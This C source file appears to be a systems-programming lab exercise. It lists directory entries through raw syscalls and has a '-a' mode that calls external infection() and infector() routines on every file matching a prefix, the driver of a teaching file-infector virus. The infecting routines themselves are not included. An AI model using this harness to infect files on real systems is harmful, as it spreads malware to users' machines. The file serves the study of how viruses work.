#define _GNU_SOURCE
#include <stdbool.h>
#include <string.h>
#include <dirent.h>
#include "util.h"

#define BUF_SIZE 1024
#define SYS_GETDENTS 141
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define STDERR 2
#define STDOUT 1
#define STDIN 0


int main(int argc, char *argv[]){

    struct linux_dirent {
           long           d_ino;
           long           d_off;

           unsigned short d_reclen;

           char           d_name[];

       };

    bool debugState = false;
    bool prefixState = false;
    bool assMode = false;
    char* prefix;
    int i;
    char d_type;

    for (i = 0 ; i < argc ; i++)
    {
        char *arg = argv[i];
        if(strcmp(arg, "-D")==0)
        {
            debugState = true;
        }
        if(strncmp(arg, "-p",2)==0)
        {
            prefixState = true;
            prefix = arg + 2;
        }
        if(strncmp(arg, "-a",2)==0)
        {
            assMode = true;
            prefix = arg + 2;
        }

    }


    struct linux_dirent *d;
    int nread;
    char buf[BUF_SIZE];
    char* nread_str;
    int fd=system_call(SYS_OPEN,".", 0 , 0); 

    
    nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
    if (nread == -1){
        system_call(SYS_WRITE,STDOUT, "error-getdents",BUF_SIZE);
        system_call(SYS_WRITE,STDOUT,"\n",1);
    }
    else if (nread == 0){
        system_call(SYS_WRITE,STDOUT, "There aren't files in the current directory",BUF_SIZE);
        system_call(SYS_WRITE,STDOUT,"\n",1);
    }
    else{
        int j;
        for(j=0; j<nread;)
        {
            d = (struct linux_dirent *) (buf + j);
            char* name = d->d_name;
            if(prefixState){
                if(strncmp(name,prefix,strlen(prefix))==0){
                    system_call(SYS_WRITE,STDOUT,name,strlen(name));
                    system_call(SYS_WRITE,STDOUT,"\n",1);

                    char* type;
                    d_type = *(buf + j + d->d_reclen - 1);
                    switch (d_type)
                    {
                    case DT_REG:
                        type = "regular";
                        break;

                    case DT_DIR:
                        type = "directory";
                        break;

                    case DT_FIFO:
                        type = "FIFO";
                        break;

                    case DT_SOCK:
                        type = "socket";
                        break;

                    case DT_LNK:
                        type = "symlink";
                        break; 

                    case DT_BLK:
                        type = "block dev";
                        break; 

                    case DT_CHR:
                        type = "char dev";
                        break;
                        
                    case DT_UNKNOWN:
                        type = "unknown";
                        break; 
            }
            system_call(SYS_WRITE,STDOUT,type,strlen(type));
            system_call(SYS_WRITE,STDOUT,"\n",1);
                }
            }
            else if(assMode){
                if(strncmp(name,prefix,strlen(prefix))==0){
                    infection();
                    infector(name);  
                }  
            }
            else{
                system_call(SYS_WRITE,STDOUT,name,strlen(name));
                system_call(SYS_WRITE,STDOUT,"\n",1);

            } 
            j += d->d_reclen;

            if(debugState){
                int len = d->d_reclen;
                char* tmp = itoa(len);
                system_call(SYS_WRITE,STDOUT,tmp,strlen(tmp));
                system_call(SYS_WRITE,STDOUT,"\n",1);
            }
        }
    }
    return 0;

}